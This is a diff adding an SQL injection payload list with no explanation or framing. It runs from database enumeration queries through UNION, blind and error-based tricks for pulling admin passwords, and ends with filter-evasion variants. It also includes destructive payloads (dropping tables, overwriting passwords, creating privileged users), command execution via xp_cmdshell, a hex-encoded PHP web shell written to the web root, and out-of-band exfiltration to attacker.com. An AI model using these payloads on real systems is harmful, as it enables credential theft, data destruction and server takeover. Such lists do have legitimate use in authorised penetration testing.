@@ -1,0 +1,100 @@
+SELECT @@datadir
+SELECT @@version
+SELECT @@basedir
+SELECT @@version_compile_os
+SELECT @@version_compile_machine
+SELECT user()
+SELECT version()
+SELECT current_user()
+SELECT system_user()
+SELECT session_user()
+SELECT current_role()
+SELECT database()
+SELECT * FROM v$version  -- Oracle
+SELECT * FROM version()  -- PostgreSQL
+SHOW databases
+SHOW schemas
+SHOW VARIABLES LIKE '%version%'
+SELECT schema_name FROM information_schema.schemata
+SELECT table_name FROM information_schema.tables WHERE table_schema = database()
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
+SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
+SELECT routine_name, routine_type 
+FROM information_schema.routines 
+WHERE routine_schema = database()
+SELECT datname FROM pg_database
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
+SELECT proname FROM pg_proc
+SELECT table_name FROM all_tables
+SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'
+SELECT object_name, object_type FROM all_objects
+SELECT name FROM master..sysdatabases
+SELECT table_name FROM information_schema.tables
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
+' ORDER BY 1--
+' ORDER BY 2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT username, password, NULL FROM users--
+' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
+' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users--
+' UNION SELECT NULL, CONCAT_WS(':', username, password), NULL FROM users--
+' OR 1=1--
+' AND 1=1--
+' AND 1=2--
+' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>97--
+' OR BINARY (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' OR (SELECT password FROM users WHERE username='admin') LIKE 'a%'--
+' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>97,SLEEP(5),0)--
+' OR (CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN pg_sleep(5) END)--
+' IF (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')>0 WAITFOR DELAY '0:0:5'--
+' OR (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE NULL END FROM dual) IS NOT NULL--
+' AND ExtractValue(0,CONCAT(0x5c,USER()))--
+' AND UpdateXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+' AND 1=CONVERT(int,@@VERSION)--
+' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--
+' AND 1=CTXSYS.DRITHSX.SN(USER,'USER')--
+' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=CONVERT(int,@@VERSION)--
+' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--
+' AND 1=CTXSYS.DRITHSX.SN(USER,'USER')--
+' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
+' DROP TABLE users--
+' UPDATE users SET password='hacked' WHERE username='admin'--
+' EXEC xp_cmdshell('whoami')--
+' EXEC master..xp_dirtree 'C:\\'--
+' DROP TABLE users--
+' CREATE USER hacker WITH PASSWORD 'p@ssw0rd'--
+' EXECUTE IMMEDIATE 'GRANT DBA TO SYS'--
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--
+' UNION SELECT 1,2,3,4,INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E--
+' DECLARE @data VARCHAR(1024)SELECT @data=(SELECT TOP 1 name FROM master..sysdatabases)EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\c$\temp\foo"')--
+' || UTL_HTTP.request('http://attacker.com/'||(SELECT username||':'||password FROM users WHERE rownum=1))--
+' CREATE EXTENSION dblink SELECT * FROM dblink_connect('host=attacker.com user=postgres password=p@ssw0rd', 'SELECT version()')--
+' OR 1=1--
+' oR 1=1--
+' Or 1=1--
+' OR'1'='1
+' OR'1'='1'--
+' OR'1'='1'/*
+' OR 1=1#
+' OR 1=1-- 
+' OR 1=1/*
+' /**/OR/**/1=1--
+' OR 'abc'='a'||'bc'--
+' OR 'abc'=CONCAT('a','bc')--
+' /*!50000OR*/ 1=1--
+' /*!OR*/ 1=1--
+' /**/OR/**/1=1--
+' /*!50000OR*/1=1--
+' OR 1 LIKE 1--
+' OR 1 REGEXP 1--
+' OR 1 IN (1)--
+' OR 1 BETWEEN 0 AND 2--
